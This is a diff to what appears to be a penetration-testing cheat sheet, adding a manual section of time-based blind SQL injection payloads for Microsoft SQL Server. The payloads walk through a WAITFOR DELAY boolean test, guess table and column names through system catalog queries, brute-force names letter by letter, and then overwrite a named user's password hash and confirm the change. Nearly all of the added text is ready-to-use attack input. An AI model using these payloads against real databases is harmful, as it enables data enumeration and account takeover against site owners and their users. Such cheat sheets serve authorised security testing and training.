@@ -555,7 +555,42 @@ Add the name of the Stored Procedure (without the dbo. part), then press OK.
 
 ## Blind SQL Injection Payloads
 
-### 1) Python Code Snippets
+### 1) Manual Exploitation
+
+10-second delay boolean test
+
+    '; IF (1=1) WAITFOR DELAY '0:0:10';--
+    '; IF (1=2) WAITFOR DELAY '0:0:10';-- (Payload should NOT have 10-second delay)
+
+Guess the name of the table schema (Instead of 'users', it can be literally ANYTHING, so you may need an educated guess on how to find it.)
+
+    '; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--
+
+Guess the column names of the table schema (Same principle, just guesswork!)
+
+    '; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--
+
+Guess a column name with the LIKE (%) operator. (Do this letter by letter to brute force it until you get a positive response from the SQL server)
+
+    '; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--
+
+Guess how many columns there are in the table
+
+    '; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10';--
+
+Verify the name of the user from the table in the database
+
+    '; IF ((select count(username) from users where username = 'butch')=1) WAITFOR DELAY '0:0:10';--
+
+Update the user's password
+
+    '; update users set password_hash = 'password123' where username = 'butch';--
+
+Confirm update
+
+    '; IF ((select count(username) from users where username = 'butch' and password_hash = 'password123')=1) WAITFOR DELAY '0:0:10';--
+
+### 2) Python Code Snippets
 
 Enumerate the number of databases
 
